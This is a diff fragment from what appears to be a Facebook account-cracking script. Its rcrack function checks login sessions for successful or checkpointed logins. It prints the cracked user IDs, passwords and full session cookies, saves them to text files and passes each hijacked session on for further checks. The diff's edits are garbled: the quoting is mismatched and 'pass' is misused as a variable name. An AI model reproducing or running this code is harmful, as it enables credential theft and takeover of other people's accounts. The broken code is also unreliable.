@@ -332,16 +332,16 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(Saadat-OK')  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(Saadat-OK')  ' +ids+ ' | ' +pass+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/AYAAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/AYAAN-OK.txt', 'a').write(' +ids+' | '+pass+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(Saadat-cp')  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/AYAAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('    \33[1;30m(Saadat-cp')  ' +ids+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/AYAAN-CP.txt', 'a').write('+ids+' | '+pass+' \n')
                 cps.append(cid)
                 break
             else:
